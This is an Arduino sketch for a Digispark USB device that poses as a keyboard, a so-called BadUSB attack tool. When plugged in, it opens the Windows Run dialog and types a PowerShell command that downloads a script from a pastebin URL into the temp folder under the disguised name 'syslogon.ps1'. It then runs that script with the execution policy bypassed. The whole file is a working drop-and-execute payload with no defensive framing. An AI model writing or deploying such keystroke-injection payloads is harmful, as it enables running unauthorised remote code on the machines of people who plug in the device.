#define LAYOUT_SPANISH
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
   DigiKeyboard.sendKeyStroke(0);

     // Waiting 500ms for init
  delay(500);

  delay(2000);

DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(100);

  DigiKeyboard.print("powershell (New-Object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/Jt7uKasT','%TEMP%/syslogon.ps1');");

  delay(100);

DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File '%TEMP%\\syslogon.ps1'");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // put your main code here, to run repeatedly:

}
